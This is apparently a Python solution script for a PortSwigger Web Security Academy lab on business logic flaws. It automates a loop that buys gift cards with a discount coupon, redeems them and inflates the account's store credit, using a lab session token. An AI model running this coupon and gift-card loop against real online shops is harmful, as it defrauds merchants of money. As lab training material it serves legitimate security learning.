# Solution for the lab ::: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money
# Author ::: Somnath

import requests
from bs4 import BeautifulSoup

# Replace the following URLs and SESSION_TOKEN with your own
URL_1 = "https://0a19009a04c7a56380567c6f003400f4.web-security-academy.net/cart"
URL_2 = "https://0a19009a04c7a56380567c6f003400f4.web-security-academy.net/cart/coupon"
URL_3 = (
    "https://0a19009a04c7a56380567c6f003400f4.web-security-academy.net/cart/checkout"
)
URL_4 = "https://0a19009a04c7a56380567c6f003400f4.web-security-academy.net/gift-card"
SESSION_TOKEN = "TQuwezXY4sSGtXPHTMY2AB8bYaD0TOrA"


def add_gift_card_to_cart(url, session_token):
    data = "productId=2&redir=PRODUCT&quantity=1"
    r = requests.post(url=url, cookies={"session": session_token}, data=data)
    print("[+] Added 'Gift Card' Product to the cart.")
    return r.status_code


def get_csrf_token(url, session_token):
    r = requests.get(url=url, cookies={"session": session_token})
    soup = BeautifulSoup(r.content, "html.parser")
    csrf_input = soup.find("input", {"name": "csrf"})
    print("[+] Got the CSRF Token.")
    return csrf_input["value"]


def apply_coupon(url, session_token, csrf_token):
    data = "csrf={}&coupon=SIGNUP30".format(csrf_token)
    r = requests.post(url=url, cookies={"session": session_token}, data=data)
    print("[+] Applied Discount Coupon.")
    return r.status_code


def perform_checkout(url, session_token, csrf_token):
    data = "csrf={}".format(csrf_token)
    r = requests.post(
        url=url, cookies={"session": session_token}, data=data, allow_redirects=True
    )
    soup = BeautifulSoup(r.content, "html.parser")
    gift_code = soup.find_all("td")
    print("[+] Checked Cart Out.")
    return gift_code[8].text


def apply_gift_card_code(url, session_token, csrf_token, gift_card_code):
    data = "csrf={}&gift-card={}".format(csrf_token, gift_card_code)
    r = requests.post(url=url, cookies={"session": session_token}, data=data)
    print("[+] Applied Gift Card Code")
    return r.status_code


def check_account_balance(url, session_token):
    r = requests.get(url=url, cookies={"session": session_token})
    soup = BeautifulSoup(r.content, "html.parser")
    balance = soup.find_all("strong")
    print("[+] Account Status :: \n" + balance[0].text + "\n\n")


counter = 450

while counter > 1:
    added_cart_status_code = add_gift_card_to_cart(URL_1, SESSION_TOKEN)
    csrf_token = get_csrf_token(URL_1, SESSION_TOKEN)
    applied_status_code = apply_coupon(URL_2, SESSION_TOKEN, csrf_token)
    obtained_gift_card_code = perform_checkout(URL_3, SESSION_TOKEN, csrf_token)
    applied_status_code = apply_gift_card_code(
        URL_4, SESSION_TOKEN, csrf_token, obtained_gift_card_code
    )
    check_account_balance(URL_1, SESSION_TOKEN)
    counter = counter - 1
